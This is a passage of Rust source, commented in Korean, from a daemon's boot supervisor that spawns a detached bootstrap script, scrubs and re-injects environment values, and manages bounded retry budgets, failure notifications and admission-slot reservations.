/// 그대로 '무엇이 잘못됐는지 알 수 없음'이 된다 — 그래서 규약 소유자에게 물어보게 한다.
pub fn supervisor_log_path(socket_path: &Path) -> PathBuf {
    spool_dir(socket_path)
        .parent()
        .map(|d| d.join("boot-supervisor.log"))
        .unwrap_or_else(|| PathBuf::from("boot-supervisor.log"))
}

/// boot-supervisor.log 크기 상한 1겹(회전 1회 — 훅 런별 로그 A16/R3 규율의 데몬면).
/// 단일 append 파일의 무상한 성장을 막는다 — 초과 시 `.1` 로 밀어내고 새로 쓴다.
const LOG_MAX_BYTES: u64 = 4 * 1024 * 1024;
fn rotate_log_if_huge(log: &Path) {
    let too_big = std::fs::metadata(log).map(|m| m.len() > LOG_MAX_BYTES).unwrap_or(false);
    if too_big {
        let rotated = log.with_extension("log.1");
        let _ = std::fs::remove_file(&rotated);
        let _ = std::fs::rename(log, &rotated);
    }
}

/// [`BootAction::EnsureTeam`] 의 프로덕션 실행자 — 부트 체인을 **데몬의 자식으로** 낳는다.
///
/// 여기서 낳은 자식은 훅의 프로세스 그룹 밖에 있다. 그것이 이 단위 전체의 목적이다
/// (`setsid` 가 없는 Windows 에서 훅 절단이 곧 부트 사망이던 경로의 해소).
///
/// ★`kill_on_drop` 을 **걸지 않는다**: 감독자는 아무것도 죽이지 않는다. 자식 핸들은 즉시
/// 드롭되고 tokio 의 고아 수거기가 좀비를 거둔다 — 부트는 자기 속도로 끝까지 간다.
fn run_ensure_team(
    daemon: &Arc<Daemon>,
    it: &BootIntent,
    _action: BootAction,
) -> Result<String, RunErr> {
    // ── (P2 · R3-P2-5) 디스패치 직전 **레지스트리 재실측** — 타임스탬프 이월 금지 ──────────
    // 인텐트의 claim{rc,at} 은 데이터(진단)일 뿐, 판정은 지금 이 순간의 roles 레지스트리다.
    // 참이면 신선한 claim 판정을 env 로 주입하고(레지스트리 소유자의 실측 — CS-3 보고=실측
    // 정합), 거짓이면 스폰하지 않고 Retire("claim_stale") 로 폐기한다 — 좌석이 죽어 master 가
    // 사라진 뒤의 재시도 정지는 **정직한 정지**다(오너 재선언이 재개 신호).
    // 락 규율: roles 락은 단독 획득 후 즉시 해제(중첩 0 — surfaces→roles 순서 규약 무접촉).
    //
    // ★(R4 수정 라운드 · 표면 축소) surface_id **부재 = fail-closed 폐기**. 유일한 정상
    //   생산자(boot.enqueue arm)는 caller_unresolved 거절로 항상 Some(sid)를 보장하므로,
    //   여기 도달하는 None 은 스풀 직접 투하(§4-10 계급)뿐이다. 종전엔 재실측을 통째로
    //   건너뛰고 신원 env 0 으로 스폰돼 rc6(session_error)×MAX_ATTEMPTS 를 태웠다 —
    //   프로덕션 경로 무손실이므로 스폰 전에 접는다(합성 인텐트 검체들은 주입 러너 경유라
    //   이 게이트와 무접촉).
    if it.surface_id.is_none() {
        return Err(RunErr::Retire("no_surface"));
    }
    let mut verified_claim: Option<(u64, Option<String>)> = None;
    if let Some(sid) = it.surface_id {
        let registry_master = { daemon.roles.lock().unwrap().get("master").copied() };
        let surface = daemon.get_surface(sid);
        let alive = surface
            .as_ref()
            .is_some_and(|s| !s.exited.load(Ordering::Relaxed));
        if !master_holds(registry_master, sid, alive) {
            return Err(RunErr::Retire("claim_stale"));
        }
        // (P1×P2 조립점) 살아있는 선언 surface 의 seat 토큰을 자식 env 로 릴레이 — 데몬 자식은
        // 어느 pane 조상 체인에도 닿지 않으므로, 창 밖 재시도의 claim 은 이 토큰이 완결한다.
        // 이 릴레이는 pane PTY env 배달과 같은 계급(데몬→자기 자식 1프로세스)이며 관측·영속
        // 채널(이벤트·로그·topology)에는 싣지 않는다(무영속·무노출 계약 유지).
        let token = surface.and_then(|s| s.seat_token.clone());
        verified_claim = Some((sid, token));
    }
    let script = cys::pack::pack_dir().join("bin").join("javis_bootstrap.py");
    if !script.is_file() {
        return Err(RunErr::Retry(format!("부트 체인 부재: {}", script.display())));
    }
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."));
    let python = crate::bundled_python3(&exe_dir).unwrap_or_else(|| "python3".to_string());
    let lane = if it.lane.is_empty() {
        daemon.socket_path.to_string_lossy().into_owned()
    } else {
        it.lane.clone()
    };
    let log = supervisor_log_path(&daemon.socket_path);
    rotate_log_if_huge(&log);
    let mut cmd = tokio::process::Command::new(&python);
    cmd.arg(&script)
        .env(cys::ENV_SOCKET, &lane)
        // ★재귀 기동 차단(치명위험 ①): 이 자식의 `cys` 호출이 소켓 연결에 실패하면
        //   `spawn_detached_daemon` 으로 **라이벌 데몬**을 낳는다. 데몬이 자기 경쟁자를
        //   낳는 재귀는 폭주 경로다(main.rs office-bridge·auto-restore 와 같은 계약).
        .env("CYS_NO_AUTOSTART", "1")
        // SEAL-1: 번들 python 이 `.pyc` 를 쓰면 코드서명 봉인이 깨진다.
        .env(cys::ENV_PY_NO_BYTECODE, cys::PY_NO_BYTECODE_ON)
        // ★(P2 · R3-P2-1/ANCHOR-1 ④) PATH 선두 = 데몬 exe_dir — bare "cys" 해소 보장.
        .env("PATH", path_with_exe_dir_first(&exe_dir, std::env::var_os("PATH")))
        .stdin(std::process::Stdio::null());
    // ── ★(R2 · 2026-08-26) provenance 상속 절단 — **주지 않기로 한 값 = 없는 값** ──────────
    // 【무엇이 틀렸었는가】 아래 주입은 **조건부**인데, 조건이 거짓일 때 상속값을 지우지 않았다.
    // `tokio::process::Command` 는 기본이 부모(데몬) env 전량 상속이므로, 데몬 env 에 남은 값이
    // 그대로 자식에게 갔다. 도달 경로는 실재한다 — 훅은 `export CYS_DECL_ORIGIN="hook-human"`
    // 후 `javis_bootstrap.py` 를 spawn 하고(그 spawn 은 `CYS_NO_AUTOSTART` 를 걸지 않는다),
    // 체인 안의 `cys` 호출이 죽은 소켓을 만나면 cysd 를 낳는다. 그 cysd 는 `hook-human` 을
    // **데몬 수명 내내** 들고 있고, 그 뒤 `decl_origin` 이 빈 인텐트(=`decide()` 가 통과시키는
    // 형상)가 디스패치되면 자식은 기계유래 게이트를 통과한 적 없이 그 마커를 얻어
    // `javis_bootstrap._dept_fallback` 의 부서 자동 생성 봉인(폭주 봉인 ⓑ)을 무료로 연다.
    // `CYS_SEAT_TOKEN` 도 같은 형태로, mint 실패 강등 시 **타 pane 의 토큰**이 자식의
    // `cys claim-role` 에 실려 나간다(세대 접두가 맞으면 claim ⓒ 가 rc6 을 시끄럽게 낸다).
    // 【수리】 조건 판정 **전에** 무조건 지우고, 필요할 때만 다시 세운다 — 'withheld = absent'
    // 를 구조로 만든다(else 를 붙이는 것보다 갈래가 하나 적어 미래에 새는 자리가 없다).
    // `CYS_ROLE` 도 같은 자리에서 끊는다: 데몬이 pane 자손의 autostart 로 떴다면 그 pane 의
    // 역할(예: worker)을 상속하고, `_Log` 가 그것을 **master 부트의 boot-last `role` 필드**로
    // 적는다(§0-A 가 사실 원천으로 읽는 파일이 조용히 거짓이 된다). 감독자가 낳는 것은 항상
    // master 부트이므로 값을 명시한다.
    cmd.env_remove("CYS_DECL_ORIGIN")
        .env_remove(cys::ENV_SEAT_TOKEN)
        .env(cys::ENV_ROLE, "master");
    // ── (P2 · R3-P2-5) provenance·claim 주입 — 위 재실측이 참일 때만 ─────────────────────
    if let Some((sid, token)) = verified_claim {
        cmd.env("CYS_SURFACE_ID", sid.to_string())
            .env("CYS_CLAIM_RC", "0")
            .env("CYS_CLAIM_SID", sid.to_string())
            // 신선한 시각 = 지금(재실측 시각). 훅 스탬프 이월 금지 — _pre_bound 결박 창(300s)은
            // 이 값 기준으로 판정되므로, 이월하면 창 밖 디스패치가 전부 rc6 계급으로 떨어진다.
            .env("CYS_CLAIM_AT", format!("{}", now_epoch() as u64))
            .env("CYS_CLAIM_OUT", "[supervisor] registry re-verified");
        if !it.decl_origin.is_empty() {
            cmd.env("CYS_DECL_ORIGIN", &it.decl_origin);
        }
        if let Some(tok) = token {
            cmd.env(cys::ENV_SEAT_TOKEN, tok);
        }
    }
    {
        use crate::state::HideConsole;
        cmd.hide_console();
    }
    match std::fs::OpenOptions::new().create(true).append(true).open(&log) {
        Ok(f) => {
            if let Ok(e) = f.try_clone() {
                cmd.stderr(e);
            }
            cmd.stdout(f);
        }
        Err(_) => {
            cmd.stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null());
        }
    }
    match cmd.spawn() {
        Ok(child) => {
            let pid = child.id().unwrap_or(0);
            // 핸들 즉시 드롭 = 기다리지 않는다(감독자 cadence 를 자식이 잡아먹지 않는다).
            // ★정직 명문(P2 · 2차 성찰 P2-3): 자식 exit 을 관측하지 않으므로 '스폰 성공=인텐트
            //   제거'이고, exit 11(싱글플라이트 skip)도 exit 10(session_error)도 여기서는
            //   '성공'으로 접힌다. 감독자의 **재시도 = 스폰 실패 한정**이며, 부트 실패 계급의
            //   재실행 주체는 §0-A(P0-3)가 유일하다 — 이 서술을 바꾸려면 exit 관측(비동기 wait)
            //   확장이 선행이다(이번 착지 범위 밖).
            drop(child);
            Ok(format!("pid={pid}"))
        }
        Err(e) => Err(RunErr::Retry(format!("스폰 실패: {e}"))),
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// 틱
// ══════════════════════════════════════════════════════════════════════════════

/// 태스크 로컬 예산(id → (시도 수, 마지막 시도 시각)). **단일 writer**(감독자 태스크)이며,
/// watchdog 의 형제 맵들과 같은 규약으로 매 틱 솎인다.
///
/// ★설계서는 이 예산을 `Daemon` 필드로 승격해 watchdog 의 `restart_counts` 와 **공유**하라고
/// 요구한다. 그 승격은 `state.rs`·`governance.rs` 를 건드리므로 이 단위의 파일 반경 밖이다.
/// 그래서 이 착지는 **공유가 필요한 상황 자체를 만들지 않는 쪽**으로 안전을 확보한다:
/// 감독자는 좌석·에이전트를 **재기동하지 않는다**(kill·close·launch 호출 0 — 검체 소스 핀).
/// 감독자가 낳는 것은 부트 체인 하나뿐이고 그 예산은 여기서 유계다.
type Budget = HashMap<String, (u32, f64)>;

/// 감독자 태스크의 **로컬 상태 전량**(단일 writer). 예산 하나만 들고 다니던 것을 묶은 이유는
/// 유계 장치가 셋으로 늘었기 때문이다 — 셋이 서로를 무너뜨리지 않게 한 자리에서 본다.
#[derive(Default)]
struct SupState {
    /// 인텐트별 (시도 수, 마지막 시도 시각) — 메모리측 예산.
    budget: Budget,
    /// **음성 캐시** — 지우지 못한 (경로, 사유). 같은 키로는 이벤트를 두 번 내지 않는다.
    ///
    /// ★유계의 정의처(재난 ①): 삭제가 성공하면 그 항목은 다음 틱에 다시 오지 않으므로
    /// 이벤트는 1건이다. 삭제가 **실패하면** 같은 항목이 매 틱 같은 판정으로 다시 올라오므로,
    /// 여기서 (항목, 사유)당 **정확히 1건**으로 접는다. 회수는 **파일이 실제로 사라졌을 때만**
    /// 한다 — 나이로 만료시키면 '3초마다' 가 '5분마다' 로 바뀔 뿐 유계가 아니다.
    undeletable: std::collections::HashSet<(String, &'static str)>,
    /// 예산 포화를 이미 알렸는가(1회성 래치 — 포화가 지속되면 매 틱 알리는 것이 곧 폭주다).
    budget_pressure_reported: bool,
    /// GC 회전 커서(`scan_spool`).
    cursor: usize,
    /// (P2 · 오너 결정 ⑧c → R2 확장) **무스폰 loud 통보 래치** — 인텐트 id 당 정확히 1회.
    ///
    /// 무스폰 종착은 여러 지점에서 관측된다(dispatch 실패 3회째 · `attempts_exhausted` 폐기 ·
    /// `claim_stale`/`no_surface`/`expired`/스키마·토큰 폐기) — 삭제 실패로 인텐트가 스풀에
    /// 남으면 같은 인텐트가 여러 지점을 다 지나므로, 래치 없이는 통보가 중복된다. 회수는
    /// 스풀에서 사라진 id 만(재선언은 선언별 유일 id 라 새 키다), 상한은 [`MAX_UNDELETABLE`]
    /// 재사용(넘치면 새 키에 침묵 — 유계가 통보보다 앞이다. 다만 그 침묵은 아래
    /// `notify_capped_reported` 로 **1회 가청화**한다 — R2 note).
    no_spawn_notified: std::collections::HashSet<String>,
    /// (R2 note) 통보 래치 상한 도달을 이미 알렸는가 — 1회성(`budget_pressure_reported` 동형).
    notify_capped_reported: bool,
    /// (B3-2R ④ⓓ) 전역 상한 정지 통보 래치 — 감독자 수명 1회.
    admission_capped_reported: bool,
    /// (R3 #7) fence 미무장 고지 래치 — 감독자 수명 1회.
    fence_disarmed_reported: bool,
    /// (R4 [5]) 고아를 **보유하고 있다**는 고지 래치 — 감독자 수명 1회.
    orphan_hold_reported: bool,
    /// (B3-5 · H-LEASE-3) 이 감독자 수명 동안 남긴 `state_unreadable` terminal 기록 수.
    unreadable_records: usize,
    /// (B3-5) 기록 상한에 걸려 **더는 남기지 않는다**는 고지 래치 — 감독자 수명 1회.
    unreadable_capped_reported: bool,
    /// (R6 [3] · codex R5) 보유 중 하나가 **처음으로 나이 임계를 넘었다**는 고지 래치 — 별도다.
    ///
    /// 왜 나눴는가: 종전에는 래치 하나가 둘을 함께 덮어서, young 상태에서 한 번 발화하면
    /// 나중에 aged 로 **전이되는 순간이 영영 보고되지 않았다**. 나이를 '진단 축' 으로 남긴
    /// 의미(R5 [4])가 바로 그 래치에 삼켜지고 있었다 — 남긴 신호가 도달하지 않으면 안 남긴
    /// 것과 같다.
    orphan_aged_reported: bool,
    /// (R3 #7) fence 무장 여부. **기본 false** — 켜는 쪽만 명시적이다.
    fence_armed: bool,
    /// (B3-5 · T3-2) 부트 v2 롤백 스위치가 **내려갔는가**(`CYS_BOOT_V2=0`).
    ///
    /// ## 왜 틱 안에서 env 를 읽지 않고 여기에 두는가
    /// `tick_in` 안에서 `std::env::var` 를 읽으면 **모든 틱 검체가 프로세스 전역 env 에
    /// 의존하게 된다** — ambient 값 하나로 무관한 검체들의 동작이 조용히 바뀌고, 검체가 그
    /// env 를 만지면 병렬로 도는 다른 검체가 그 값을 본다. 이 저장소가 방금 값을 치른 계급이
    /// 정확히 그것이다(auth 게이트 ↔ 마스터 스위치 락 사건). 그래서 판독은 [`spawn`] 1회이고
    /// 틱은 이 스냅샷을 본다 — `fence_armed`·`epoch` 와 같은 규약이다.
    ///
    /// ## 왜 '꺼짐' 이 아니라 '내려갔는가' 인가(역극성)
    /// `Default` 가 `false` 이므로 이 이름이면 기본이 **'스위치는 올라가 있다'**(= v2 켜짐)가
    /// 된다. 그것이 실제 기본값이다(`CYS_BOOT_V2` 는 `Some("0")` 만 끔). 이름을 뒤집지 않으면
    /// 검체가 기본 상태에서 롤백 경로를 타 버린다.
    boot_v2_off: bool,
    /// (R3 #2) 이 감독자 수명의 영속 epoch — lease identity 의 한 축.
    epoch: u64,
}

/// 스풀 항목 1건을 지우고 **이벤트를 내도 되는지**를 함께 판정한다.
///
/// 반환 `Some(removed)` = 지금 발행하라(값은 실제 삭제 여부) · `None` = 이미 알린 사실이다.
/// 종전 코드는 `let _ = remove_file(..)` 뒤에 **무조건** 발행했다 — 지워지지 않는 항목 하나가
/// 감독자 cadence(3초)마다 영구히 이벤트를 낸다(재난 ①). Windows 가 주 경로다: 읽기전용
/// 속성·다른 프로세스가 연 파일에서 `remove_file` 이 실패하고, `ensure_spool` 의 권한
/// 재강제는 `#[cfg(unix)]` 라 거기서는 아무 것도 고치지 않는다.
fn remove_and_gate(
    st: &mut SupState,
    remover: Remover,
    p: &Path,
    why: &'static str,
) -> Option<bool> {
    let key = (p.to_string_lossy().into_owned(), why);
    if remover(p) {
        st.undeletable.remove(&key);
        return Some(true);
    }
    // 이미 알렸다 · 캐시가 찼다 → **침묵**. 캐시를 비우는 것은 폭주를 다시 여는 것과 같다.
    if st.undeletable.contains(&key) || st.undeletable.len() >= MAX_UNDELETABLE {
        return None;
    }
    st.undeletable.insert(key);
    Some(false)
}

/// 무스폰 사유의 **사람이 읽는 문면**. 닫힌 집합이며 미지 사유는 일반 문안으로 접힌다
/// (`decide`·`RunErr` 가 낳는 토큰 전량이 여기 등재된다 — 새 토큰을 추가하면 여기도 함께).
fn no_spawn_reason(why: &str) -> &'static str {
    match why {
        "attempts_exhausted" | "dispatch_failed" => "스폰이 예산(3회)까지 전부 실패했다",
        "claim_stale" => "선언 좌석이 더 이상 master 가 아니다(좌석 종료·인계) — 남은 재시도도 같은 판정이라 정지했다",
        "no_surface" => "인텐트에 선언 좌석이 없다(스풀 직접 투하 의심) — 스폰하지 않았다",
        "expired" => "인텐트가 수명(30분)을 넘겼다(kill-switch pause 지속 등) — 지금 팀을 띄우는 것은 오너가 기대한 인과가 아니라 폐기했다",
        "schema_mismatch" => "인텐트 스키마가 이 데몬과 다르다(팩·데몬 다운그레이드 스큐)",
        "unknown_action" | "unknown_decl_origin" => "인텐트가 인정되지 않는 토큰을 날랐다(닫힌 집합 밖) — 실행하지 않고 폐기했다",
        _ => "부트 감독자가 이 선언으로 팀을 띄우지 못했다",
    }
}

/// (P2 · 오너 결정 ⑧c → ★R2 확장) **무스폰 loud 종착** — "버스 이벤트만"은 마스터가 아직
/// 태어나지 않은 시점의 방송이라 청중이 0 인 조용한 포기다(WDSI 좀비 18회의 교훈: 정지 조건 +
/// **가시성**). 채널 3개: ①기존 버스 이벤트(호출부의 `dispatch_failed`/`intent_retired` —
/// 여기서 내지 않는다) ②데몬 내부 feed 항목(kind=`bootstrap-fail` — 훅 `_notify_bg` 와 동일
/// 분류) ③선언 surface 생존 시 **원장 선기록 후** 1줄 정직 통보.
///
/// ## ★트리거 재정의(R2 must_fix · 2026-08-26) — '예산 소진' 이 아니라 '스폰 0회'
/// 종전 호출부는 `attempts_exhausted`·`dispatch_failed` **둘뿐**이었다. 그런데 P2 frontdoor 는
/// 훅이 스폰하지 않고 exit 0 한 뒤 모델에게 "곧 스폰하고 … 소진 시 이 화면과 승인 Feed 로
/// 통보한다" 고 **약속**한다(`hooks/role-bootstrap.sh` frontdoor note). `claim_stale`·
/// `no_surface`·`expired`·`schema_mismatch`·`unknown_action`·`unknown_decl_origin` 은 그
/// 약속을 지키지 않고 팀 0노드로 끝났다 — boot-last 기록도 없어 §0-A session_error 행(P0-3)의
/// 근거조차 생기지 않으므로 사용자 관측은 정확히 '선언했는데 무반응'이다. 그래서 트리거를
/// **"이 인텐트는 스폰 0회로 끝났다"** 로 옮기고 사유 문안만 분기한다(`no_spawn_reason`).
/// 유계는 그대로다 — 래치 키는 인텐트 id 이므로 **인텐트당 1회**이고, 호출부는 틱당 통보
/// 예산(`MAX_RETIRE_NOTIFY_PER_TICK`)을 따로 집행한다.
///
/// ★③에 `cfg!(unix)` 게이트를 걸지 않는다(`announce_seat_takeover` 와 **다른** 신규 경로):
///   통보의 주 청중이 정확히 Windows 다(setsid 부재 계급) — 같은 게이트를 답습하면 정확히
///   필요한 곳에서 침묵한다(2차 성찰 P2-3). 저 함수의 `#` 주석 접두도 쓰지 않는다 —
///   여기의 대상은 빈 셸 좌석이 아니라 선언 pane(Claude 세션)이고, 기계 push 오인은 원장
///   선기록(`Origin::Supervisor`)이 이미 봉인한다(delivery.rs 불변식 ①).
///
/// `pane_budget` = 이번 틱에 **pane 주입**이 몇 건 더 허용되는가(호출부가 소유·감소시킨다).
/// feed 항목과 버스 이벤트는 이 예산과 무관하게 나간다 — 잘리는 것은 홍수 채널 하나뿐이다.
fn notify_no_spawn(
    daemon: &Arc<Daemon>,
    st: &mut SupState,
    it: &BootIntent,
    why: &str,
    pane_budget: &mut usize,
) {
    if st.no_spawn_notified.contains(&it.id) {
        return;
    }
    if st.no_spawn_notified.len() >= MAX_UNDELETABLE {
        notify_capped_once(daemon, st, "latch_full", why);
        return;
    }
    st.no_spawn_notified.insert(it.id.clone());
    let text = format!(
        "[cys-supervisor] 팀이 이 선언으로 뜨지 않았다(intent={} why={why}) — {}. 재선언이 재개 신호다. 근거: boot-supervisor.log · boot-last",
        it.id,
        no_spawn_reason(why)
    );
    // ★feed 는 **무조건**이다 — '조용히 사라지는 갈래 0' 의 하한선.
    daemon.push_feed_notification("bootstrap-fail", "부트 감독자 무산(팀 미기동)", &text, it.surface_id);
    // pane 주입만 틱 예산에 걸린다(홍수 방지). 잘려도 feed·이벤트가 사실을 이미 남겼다.
    if *pane_budget == 0 {
        notify_capped_once(daemon, st, "pane_per_tick", why);
        return;
    }
    *pane_budget -= 1;
    if let Some(sid) = it.surface_id {
        if let Some(s) = daemon.get_surface(sid) {
            if !s.exited.load(Ordering::Relaxed) {
                // ★원장 선기록이 주입보다 앞(delivery.rs 불변식 ① — dispatch_one 과 같은 순서).
                crate::delivery::record_audited(
                    daemon,
                    sid,
                    &text,
                    crate::delivery::Origin::Supervisor,
                    None,
                );
                // try_send: 채널 포화면 조용히 포기 — 통보는 best-effort 이고 feed·이벤트가
                // 이미 사실을 남겼다(고지 실패가 유계를 흔들면 안 된다).
                let _ = s.write_tx.try_send(crate::state::WriteReq::Inject {
                    text,
                    cr_delay_ms: 120,
                    clear_first: false,
                });
            }
        }
    }
}

/// (★R2 note) 통보가 **유계로 잘렸다**는 사실의 1회성 가청화(`budget_pressure_reported` 동형).
///
/// 유계가 통보보다 앞이라는 절충은 유지하되, 이 파일의 다른 유계 방어(`undeletable`·
/// `budget_pressure`)가 전부 최소 1건의 이벤트를 남기는데 통보 절단만 아무 흔적이 없던
/// 비대칭을 없앤다 — 256건 동시 무산은 이미 병리 상태이고, 정확히 그 순간 침묵하면 안 된다.
/// (R3 #3 · codex BLOCK) admission 관측 — **fail-closed**.
///
/// 잠금 획득에 실패하면(Mutex poison 등) `None` 을 돌리고 호출부는 **상한에 걸린 것으로** 친다.
/// 못 세는데 낳는 것이 이 축에서 가장 나쁜 실패다 — 세지 못하는 상태에서 프로세스를 늘리면
/// 유계가 무너진 것을 아무도 모른다. 관측 불능은 통과가 아니다(이 세션의 규율 그대로).
/// (B4-1 · A18 [2]) **admission 예약 증서** — 존재하면 그 레인의 활성 슬롯을 실제로 잡았다는 뜻.
///
/// 키는 `(intent, epoch, generation)` 이고 [`FencedRun::key`] 와 **같은 모양**이다(A18 ⓔ) —
/// 분모(고아 원장)와 분자(활성 예약)가 다른 키를 쓰면 같은 런이 양쪽에 다르게 세어져 상한이
/// **조용히** 어긋난다.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AdmissionReservation {
    lane: String,
    key: (String, u64, u32),
}

impl AdmissionReservation {
    pub fn key(&self) -> (&str, u64, u32) {
        (self.key.0.as_str(), self.key.1, self.key.2)
    }
    pub fn lane(&self) -> &str {
        &self.lane
    }
}

/// (B4-1 · codex R7 [2]) 레인의 활성 슬롯을 **원자로 예약**한다 — 잡았으면 증서, 이미 찼으면 `None`.
///
/// 종전 등록은 무조건 덮어쓰기였다. 이미 활성인 런이 있어도 표가 조용히 교체되고, 원래 런은
/// **표에서 사라진 채 프로세스만 남는다**. 잠금을 한 번만 잡고 그 안에서 검사와 삽입을 함께
/// 한다 — 나눠 잡으면 그 사이가 곧 이 함수가 막으려는 경주다.
/// (B4-1 · master ⓔ) 예약이 거절된 **이유** — `Option` 으로 접으면 두 사실이 같아 보인다.
///
/// `Occupied`(그 레인이 이미 활성이다)와 `Unobservable`(표를 읽지 못했다)은 조치가 다르다.
/// 앞은 정상적인 유계 동작이고, 뒤는 **관측 불능**이라 그 자체가 병리 신호다. 같은 값으로
/// 접으면 사고 때 둘을 구별할 수 없다 — 이 세션이 반복해서 값을 치른 계급이다.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AdmissionRefusal {
    /// 그 레인이 이미 활성이다(G1 · 정상 유계).
    Occupied,
    /// 활성 표를 읽지 못했다 — 관측 불능은 통과가 아니다.
    Unobservable,
}

impl AdmissionRefusal {
    pub fn as_str(&self) -> &'static str {
        match self {
            AdmissionRefusal::Occupied => "occupied",
            AdmissionRefusal::Unobservable => "unobservable",
        }
    }
}

pub fn reserve_admission(
    daemon: &Arc<Daemon>,
    lane: &str,
    run: BootRunActive,
) -> Result<AdmissionReservation, AdmissionRefusal> {
    let key = (run.intent.clone(), run.epoch, run.generation);
    let mut g = daemon
        .boot_run_active
        .lock()
        .map_err(|_| AdmissionRefusal::Unobservable)?;
    if g.contains_key(lane) {
        return Err(AdmissionRefusal::Occupied); // **덮어쓰지 않는다**
    }
    g.insert(lane.to_string(), run);
    Ok(AdmissionReservation { lane: lane.to_string(), key })
}

/// (B4-1) 예약 해제 — 슬롯을 놓는다. 반환은 실제로 놓았는가.
///
/// ## 해제 경로는 **넷**이다 — 하나라도 빠지면 그 레인이 영구 정지한다
/// ①terminal ②fence ③**스폰 시도 실패**(master ⓒ 지적 — 예약 후 스폰이 실패하면 슬롯이
/// 영구 점유된다) ④확인된 exit([`release_confirmed_exit`]). ③이 빠지면 첫 스폰 실패로
/// 그 레인이 다시는 부트하지 못한다 — 예약을 넣으면서 해제를 빠뜨리는 것과 같은 계열이다.
pub fn release_admission(daemon: &Arc<Daemon>, lane: &str) -> bool {
    daemon
        .boot_run_active
        .lock()
        .map(|mut g| g.remove(lane).is_some())
        .unwrap_or(false)
}

/// (B4-2 · A18 [5]) **확인된 exit** 관측으로 회수한다 — 활성 슬롯과 고아 원장을 함께 정리한다.
///
/// R5 [4]에서 나이 기반 삭제를 폐지하며 "원장에서 빼는 유일한 근거는 확인된 exit" 이라고
/// 적었고, 그 주체가 여기다. 나이는 진단이고 이것이 근거다.
pub fn release_confirmed_exit(daemon: &Arc<Daemon>, key: (&str, u64, u32)) -> bool {
    let mut freed = false;
    if let Ok(mut hist) = daemon.boot_fenced.lock() {
        let before = hist.len();
        hist.retain(|f| f.key() != key);
        freed |= hist.len() != before;
    }
    if let Ok(mut act) = daemon.boot_run_active.lock() {
        let lane = act
            .iter()
            .find(|(_, r)| (r.intent.as_str(), r.epoch, r.generation) == key)
            .map(|(l, _)| l.clone());
        if let Some(l) = lane {
            act.remove(&l);
            freed = true;
        }
    }
    freed
}

fn admission_state(daemon: &Arc<Daemon>) -> Option<(usize, usize)> {
    let orphans = daemon.boot_fenced.lock().ok()?.len();
    let active = daemon.boot_run_active.lock().ok()?.len();
    Some((orphans, active))
}

/// (B3-2R ④ⓓ) **전역 상한 정지 통보.**
///
/// `notify_no_spawn` 을 쓰지 않는 이유는 트리거가 다르기 때문이다 — 그쪽의 계약은 "이 인텐트는
/// **스폰 0회로 끝났다**" 인데, 상한 정지는 종착이 아니라 **일시 정지**다(고아가 접히면 같은
/// 인텐트가 다시 시도된다). 종착 통보로 내보내면 사용자는 끝나지 않은 것을 끝났다고 읽는다.
///
/// 그래도 조용하면 안 된다: 상한에 걸린 동안 **부트가 하나도 나지 않는다**. 래치는 감독자
/// 수명 1회다(매 틱 반복 금지).
fn notify_admission_capped(daemon: &Arc<Daemon>, st: &mut SupState, counts: Option<(usize, usize)>) {
    if st.admission_capped_reported {
        return;
    }
    st.admission_capped_reported = true;
    let body = match counts {
        Some((orphans, active)) => format!(
            "회수하지 못한 부트 고아 {orphans}건 + 진행 중 {active}건이 상한 {MAX_LIVE_BOOT_RUNS}에 \
             도달해 새 부트를 낳지 않습니다. 이 감독자는 프로세스를 죽이지 않으므로(오살 0 계약) \
             고아는 스스로 끝나거나 최대 30분 뒤 원장에서 접힙니다. 지금 확인하려면 cys ps 로 \
             부트 프로세스를 보십시오(표에 pid 가 실려 있습니다)."
        ),
        // ★R3 #3: 관측 자체가 안 되는 경우다. 이때 낳지 않는 것이 fail-closed 이고, 그 사실이
        //   상한 도달과 **구별되어** 보여야 한다 — 원인이 다르면 처방도 다르다.
        None => "부트 감독자가 동시 실행 수를 관측하지 못해(내부 표 잠금 실패) 새 부트를 낳지 \
                 않습니다. 세지 못하는 상태에서 프로세스를 늘리면 유계가 무너진 것을 아무도 \
                 모르므로 안전한 쪽으로 멈춥니다. 데몬 재기동이 이 상태를 해소합니다."
            .to_string(),
    };
    daemon.push_feed_notification("bootstrap-fail", "부트 감독자 일시 정지 — 동시 실행 상한", &body, None);
}

/// (R3 #7) fence 미무장 고지 — 감독자 수명 1회. 조용히 안 하는 것과 **안 하기로 정한 것**은
/// 다르고, 그 차이가 보이지 않으면 다음 사람이 fence 가 도는 줄 안다.
fn notify_fence_disarmed_once(daemon: &Arc<Daemon>, st: &mut SupState) {
    if st.fence_disarmed_reported {
        return;
    }
    st.fence_disarmed_reported = true;
    publish(
        daemon,
        "boot_supervisor.fence_disarmed",
        json!({"env": ENV_FENCE_ARMED, "armed": false,
               "note": "fence 판정·세대 상승·재개 전면 금지 — 러너 CAS·자멸(B4) 착지 전 봉인"}),
    );
}

/// (R4 [5]) armed 경로에서 **나이만으로 지우지 않았다**는 사실의 1회성 가청화.
///
/// 이 보류는 부트가 안 나는 상태로 이어질 수 있다(고아가 분모에 남아 admission 상한을 채운다).
/// 그런 정지가 조용하면 운영자는 원인을 찾을 자리가 없다 — 안 하기로 정한 것과 그냥 안 되는
/// 것은 다르고, 그 차이를 말하는 것이 이 한 줄의 값이다.
fn notify_orphan_hold_once(daemon: &Arc<Daemon>, st: &mut SupState, held: usize, aged: usize) {
    if st.orphan_hold_reported {
        return;
    }
    st.orphan_hold_reported = true;
    publish(
        daemon,
        "boot_supervisor.orphan_hold",
        json!({"held": held, "aged": aged, "cap": MAX_LIVE_BOOT_RUNS,
               "age_threshold_secs": FENCED_REAP_AGE_SECS,
               "note": "고아는 나이로 지우지 않는다(armed 무관 · R5 [4]) — 원장에서 빼는 유일한 근거는 확인된 exit 관측(A18 [5] · B4)이고, 나이는 '너무 오래 쥐고 있다' 는 진단 신호일 뿐이다"}),
    );
}

/// (R6 [3] · codex R5) 보유 고아가 **처음으로 나이 임계를 넘은 순간**의 1회성 고지.
///
/// 보유 고지와 **다른 래치**를 쓴다. 같은 래치를 공유하면 young 일 때 한 번 발화한 뒤 aged 로
/// 전이되는 순간이 조용해진다 — 나이를 진단 축으로 남긴 이유가 그 자리에서 사라진다.
